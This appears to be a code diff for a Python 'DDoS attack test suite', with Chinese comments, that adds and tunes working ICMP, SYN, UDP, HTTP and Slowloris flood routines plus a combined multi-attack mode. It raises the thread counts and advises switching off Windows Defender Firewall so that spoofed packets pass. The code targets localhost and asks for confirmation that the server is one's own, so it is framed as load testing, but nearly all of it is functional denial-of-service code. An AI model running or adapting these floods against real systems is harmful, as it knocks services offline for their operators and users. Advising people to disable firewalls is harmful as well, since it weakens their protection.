@@ -13,10 +13,27 @@ import sys
 from collections import Counter
 
 # ===== 配置區 =====
-TARGET_IP = "127.0.0.1"
-TARGET_PORT = 8000
-THREAD_COUNT = 20
-DURATION = 30  # 秒
+# 自動取得網卡 IP
+def get_local_ip():
+    """自動取得本機網卡 IP (非 127.0.0.1)"""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        local_ip = s.getsockname()[0]
+        s.close()
+        return local_ip
+    except:
+        return "192.168.0.201"  # 備用值
+
+TARGET_IP = "127.0.0.1"              # 本機測試 (HTTP/TCP 有效)
+TARGET_IP_REAL = get_local_ip()      # 自動偵測網卡 IP (用於 ICMP)
+TARGET_PORT = 8000                   # 對應 muti_server.py 的 TCP_PORT
+UDP_TARGET_PORT = 9001               # 對應 muti_server.py 的 UDP_PORT
+THREAD_COUNT = 50                    # 增加線程數以產生明顯效果
+DURATION = 30                        # 秒
+
+print(f"\n🌐 自動偵測到網卡 IP: {TARGET_IP_REAL}")
+print(f"📌 本機測試 IP: {TARGET_IP}\n")
 # ==================
 
 class AttackStats:
@@ -97,23 +114,29 @@ class ICMPFlood:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
             sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+            
+            print(f"🔵 ICMP Flood 執行緒已啟動 → {target_ip}")
         except PermissionError:
             print("❌ ICMP Flood 需要 root/管理員權限")
             print("💡 Linux/Mac: sudo python3 script.py")
             print("💡 Windows: 以管理員身份執行")
             return
-        
-        print(f"🔵 ICMP Flood 已啟動 → {target_ip}")
+        except Exception as e:
+            print(f"❌ ICMP Flood 初始化失敗: {e}")
+            return
         
         while running:
             try:
                 packet = ICMPFlood.create_icmp_packet()
                 sock.sendto(packet, (target_ip, 0))
                 stats.increment("packets")
+                # 無延遲，盡可能快速發送
             except Exception as e:
                 stats.add_error(f"ICMP: {type(e).__name__}")
+                time.sleep(0.001)  # 錯誤時短暫延遲
         
         sock.close()
+        print(f"🔵 ICMP Flood 執行緒已停止")
 
 # ==================== 2. SYN Flood ====================
 class SYNFlood:
@@ -209,11 +232,23 @@ class SYNFlood:
         """執行 SYN Flood"""
         global running
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+            # Windows 需要使用不同的 socket 類型
+            import platform
+            if platform.system() == 'Windows':
+                # Windows: 使用 IPPROTO_IP 可以發送自訂 IP 封包
+                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
+            else:
+                # Linux/Mac: 使用 IPPROTO_TCP
+                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+            
             sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
         except PermissionError:
             print("❌ SYN Flood 需要 root/管理員權限")
             print("💡 請改用 SYN Flood (簡化版)")
+            return
+        except OSError as e:
+            print(f"❌ SYN Flood 初始化失敗: {e}")
+            print("💡 Windows 可能需要特殊網路設定或請改用選項 3")
             return
         
         print(f"🔴 SYN Flood 已啟動 → {target_ip}:{target_port}")
@@ -246,7 +281,9 @@ class SYNFloodSimple:
         通過快速創建和丟棄連接來模擬 SYN Flood 效果
         """
         global running
-        print(f"🟡 SYN Flood (簡化版) 已啟動 → {target_ip}:{target_port}")
+        print(f"🟡 SYN Flood (簡化版) 執行緒已啟動 → {target_ip}:{target_port}")
+        
+        sockets_pool = []  # 保留部分半開連接
         
         while running:
             try:
@@ -261,11 +298,36 @@ class SYNFloodSimple:
                     pass
                 
                 stats.increment("connections")
-                # 不關閉 socket，讓它保持半開狀態
-                # sock.close()  # 故意不關閉
                 
+                # 保留一些半開連接，其他關閉以避免耗盡本地端口
+                if len(sockets_pool) < 50:
+                    sockets_pool.append(sock)
+                else:
+                    try:
+                        sock.close()
+                    except:
+                        pass
+                
+                # 定期清理舊連接
+                if len(sockets_pool) >= 50:
+                    old_sock = sockets_pool.pop(0)
+                    try:
+                        old_sock.close()
+                    except:
+                        pass
+                        
             except Exception as e:
                 stats.add_error(f"SYN-Simple: {type(e).__name__}")
+                time.sleep(0.01)
+        
+        # 清理
+        for sock in sockets_pool:
+            try:
+                sock.close()
+            except:
+                pass
+        
+        print(f"🟡 SYN Flood (簡化版) 執行緒已停止")
 
 # ==================== 4. HTTP Request Flood ====================
 class HTTPFlood:
@@ -318,7 +380,7 @@ class Slowloris:
     def attack(target_ip, target_port, duration):
         """執行 Slowloris 攻擊"""
         global running
-        print(f"🟣 Slowloris 已啟動 → {target_ip}:{target_port}")
+        print(f"🟣 Slowloris 執行緒已啟動 → {target_ip}:{target_port}")
         
         sockets = []
         
@@ -364,6 +426,40 @@ class Slowloris:
                 sock.close()
             except:
                 pass
+        
+        print(f"🟣 Slowloris 執行緒已停止")
+
+# ==================== 6. UDP Flood ====================
+class UDPFlood:
+    """UDP Flood 攻擊"""
+    
+    @staticmethod
+    def attack(target_ip, target_port, duration):
+        """執行 UDP Flood"""
+        global running
+        print(f"🔵 UDP Flood 執行緒已啟動 → {target_ip}:{target_port}")
+        
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        except Exception as e:
+            print(f"❌ UDP Socket 創建失敗: {e}")
+            return
+        
+        # 隨機資料負載
+        payload_sizes = [64, 128, 256, 512, 1024, 1472]  # 1472 是以太網 MTU 的安全值
+        
+        while running:
+            try:
+                size = random.choice(payload_sizes)
+                payload = random.randbytes(size)
+                sock.sendto(payload, (target_ip, target_port))
+                stats.increment("packets")
+            except Exception as e:
+                stats.add_error(f"UDP: {type(e).__name__}")
+                time.sleep(0.001)
+        
+        sock.close()
+        print(f"🔵 UDP Flood 執行緒已停止")
 
 # ==================== 主程式 ====================
 def print_stats_loop(start_time):
@@ -392,23 +488,37 @@ def run_attack_suite():
     print("💣 DDoS 攻擊測試套件")
     print("="*80)
     print("選擇攻擊類型:")
-    print("1. ICMP Flood (需要 root 權限) - ⚠️ 消耗網路頻寬")
-    print("2. SYN Flood (需要 root 權限) - ✅ 耗盡 TCP 連接")
-    print("3. SYN Flood 簡化版 (無需 root) - ✅ 半開連接攻擊")
-    print("4. HTTP GET Flood - ✅ 應用層攻擊")
-    print("5. HTTP POST Flood - ✅ 應用層攻擊")
-    print("6. Slowloris 慢速攻擊 - ✅ 連接耗盡")
-    print("7. 組合攻擊 (3+4+6) - 🔥 最強效果")
+    print("1. ICMP Flood (需要管理員) - ⚠️ 127.0.0.1 無效，需用網卡 IP")
+    print("2. SYN Flood (需要管理員) - ⚠️ Windows 防火牆會攔截")
+    print("3. SYN Flood 簡化版 ✅ - 半開連接攻擊 (推薦)")
+    print("4. HTTP GET Flood ✅ - 應用層攻擊 (推薦)")
+    print("5. HTTP POST Flood ✅ - 應用層攻擊 (推薦)")
+    print("6. Slowloris ✅ - 連接耗盡攻擊")
+    print("7. UDP Flood ✅ - UDP 洪水攻擊")
+    print("8. 組合攻擊 (3+4+6) 🔥 - 多重攻擊 (推薦)")
+    print("="*80)
+    print("\n💡 說明:")
+    print("  - 選項 1-2 在 Windows 上效果有限 (防火牆 + OS 優化)")
+    print("  - 選項 3-8 可直接測試，效果明顯")
+    print("  - ICMP 測試需修改 TARGET_IP_REAL 為網卡 IP (非 127.0.0.1)")
     print("="*80)
     
-    choice = input("選擇攻擊類型 (1-7): ").strip()
+    choice = input("\n選擇攻擊類型 (1-8): ").strip()
     
-    confirm = input(f"\n⚠️  目標: {TARGET_IP}:{TARGET_PORT}\n⚠️  請確認這是你自己的伺服器 (yes/no): ")
-    if confirm.lower() != "yes":
+    # 根據選擇決定目標 IP
+    if choice == "1" and TARGET_IP_REAL:
+        target_ip = TARGET_IP_REAL
+        print(f"\n💡 使用網卡 IP: {target_ip} (ICMP 測試)")
+    else:
+        target_ip = TARGET_IP
+    
+    confirm = input(f"\n⚠️  目標: {target_ip}:{TARGET_PORT}\n⚠️  請確認這是你自己的伺服器 (y/no): ")
+    if confirm.lower() != "y":
         print("❌ 測試已取消")
         return
     
-    print(f"\n🚀 啟動攻擊... (持續 {DURATION} 秒)\n")
+    print(f"\n🚀 啟動攻擊... (持續 {DURATION} 秒)")
+    print(f"💡 提示: 同時開啟 muti_server.py 以監控攻擊效果\n")
     
     running = True
     threads = []
@@ -420,28 +530,48 @@ def run_attack_suite():
     
     if choice == "1":
         # ICMP Flood
+        if target_ip == "127.0.0.1":
+            print("\n⚠️  警告: ICMP 對 127.0.0.1 無效!")
+            print("   請修改腳本中的 TARGET_IP_REAL 為網卡 IP")
+            print("   例如: TARGET_IP_REAL = '192.168.0.201'")
+            alt = input("\n繼續測試? (y/n): ").strip().lower()
+            if alt != 'y':
+                return
+        
+        print(f"🔵 啟動 {THREAD_COUNT} 個 ICMP Flood 執行緒...\n")
         for _ in range(THREAD_COUNT):
-            t = threading.Thread(target=ICMPFlood.attack, args=(TARGET_IP, DURATION), daemon=True)
+            t = threading.Thread(target=ICMPFlood.attack, args=(target_ip, DURATION), daemon=True)
             t.start()
             threads.append(t)
     
     elif choice == "2":
         # SYN Flood
+        print("\n⚠️  注意: Windows 防火牆會攔截偽造封包")
+        print("   建議:")
+        print("   1. 暫時關閉防火牆: 控制台 → Windows Defender 防火牆 → 關閉")
+        print("   2. 或使用選項 3 (SYN Flood 簡化版)")
+        alt = input("\n繼續測試? (y/n): ").strip().lower()
+        if alt != 'y':
+            return
+        
+        print(f"🔴 啟動 {THREAD_COUNT} 個 SYN Flood 執行緒...\n")
         for _ in range(THREAD_COUNT):
-            t = threading.Thread(target=SYNFlood.attack, args=(TARGET_IP, TARGET_PORT, DURATION), daemon=True)
+            t = threading.Thread(target=SYNFlood.attack, args=(target_ip, TARGET_PORT, DURATION), daemon=True)
             t.start()
             threads.append(t)
     
     elif choice == "3":
         # SYN Flood 簡化版
+        print(f"🟡 啟動 {THREAD_COUNT} 個 SYN Flood (簡化版) 執行緒...\n")
         for _ in range(THREAD_COUNT):
-            t = threading.Thread(target=SYNFloodSimple.attack, args=(TARGET_IP, TARGET_PORT, DURATION), daemon=True)
+            t = threading.Thread(target=SYNFloodSimple.attack, args=(target_ip, TARGET_PORT, DURATION), daemon=True)
             t.start()
             threads.append(t)
     
     elif choice == "4":
         # HTTP GET Flood
-        target_url = f"http://{TARGET_IP}:{TARGET_PORT}"
+        print(f"🟢 啟動 {THREAD_COUNT} 個 HTTP GET Flood 執行緒...\n")
+        target_url = f"http://{target_ip}:{TARGET_PORT}"
         for _ in range(THREAD_COUNT):
             t = threading.Thread(target=HTTPFlood.attack, args=(target_url, "GET", DURATION), daemon=True)
             t.start()
@@ -449,7 +579,8 @@ def run_attack_suite():
     
     elif choice == "5":
         # HTTP POST Flood
-        target_url = f"http://{TARGET_IP}:{TARGET_PORT}"
+        print(f"🟢 啟動 {THREAD_COUNT} 個 HTTP POST Flood 執行緒...\n")
+        target_url = f"http://{target_ip}:{TARGET_PORT}"
         for _ in range(THREAD_COUNT):
             t = threading.Thread(target=HTTPFlood.attack, args=(target_url, "POST", DURATION), daemon=True)
             t.start()
@@ -457,33 +588,47 @@ def run_attack_suite():
     
     elif choice == "6":
         # Slowloris
-        for _ in range(5):  # 少量執行緒即可
-            t = threading.Thread(target=Slowloris.attack, args=(TARGET_IP, TARGET_PORT, DURATION), daemon=True)
+        print(f"🟣 啟動 10 個 Slowloris 執行緒...\n")
+        for _ in range(10):  # Slowloris 不需要太多執行緒
+            t = threading.Thread(target=Slowloris.attack, args=(target_ip, TARGET_PORT, DURATION), daemon=True)
             t.start()
             threads.append(t)
     
     elif choice == "7":
+        # UDP Flood
+        print(f"🔵 啟動 {THREAD_COUNT} 個 UDP Flood 執行緒...\n")
+        for _ in range(THREAD_COUNT):
+            t = threading.Thread(target=UDPFlood.attack, args=(target_ip, UDP_TARGET_PORT, DURATION), daemon=True)
+            t.start()
+            threads.append(t)
+    
+    elif choice == "8":
         # 組合攻擊
-        print("🔥 啟動組合攻擊:")
+        print("🔥 啟動組合攻擊:\n")
         
         # SYN Flood 簡化版
+        print(f"  - {THREAD_COUNT // 3} 個 SYN Flood (簡化版)")
         for _ in range(THREAD_COUNT // 3):
-            t = threading.Thread(target=SYNFloodSimple.attack, args=(TARGET_IP, TARGET_PORT, DURATION), daemon=True)
+            t = threading.Thread(target=SYNFloodSimple.attack, args=(target_ip, TARGET_PORT, DURATION), daemon=True)
             t.start()
             threads.append(t)
         
         # HTTP Flood
-        target_url = f"http://{TARGET_IP}:{TARGET_PORT}"
+        print(f"  - {THREAD_COUNT // 3} 個 HTTP GET Flood")
+        target_url = f"http://{target_ip}:{TARGET_PORT}"
         for _ in range(THREAD_COUNT // 3):
             t = threading.Thread(target=HTTPFlood.attack, args=(target_url, "GET", DURATION), daemon=True)
             t.start()
             threads.append(t)
         
         # Slowloris
-        for _ in range(3):
-            t = threading.Thread(target=Slowloris.attack, args=(TARGET_IP, TARGET_PORT, DURATION), daemon=True)
+        print(f"  - 5 個 Slowloris")
+        for _ in range(5):
+            t = threading.Thread(target=Slowloris.attack, args=(target_ip, TARGET_PORT, DURATION), daemon=True)
             t.start()
             threads.append(t)
+        
+        print()
     
     else:
         print("❌ 無效選擇")
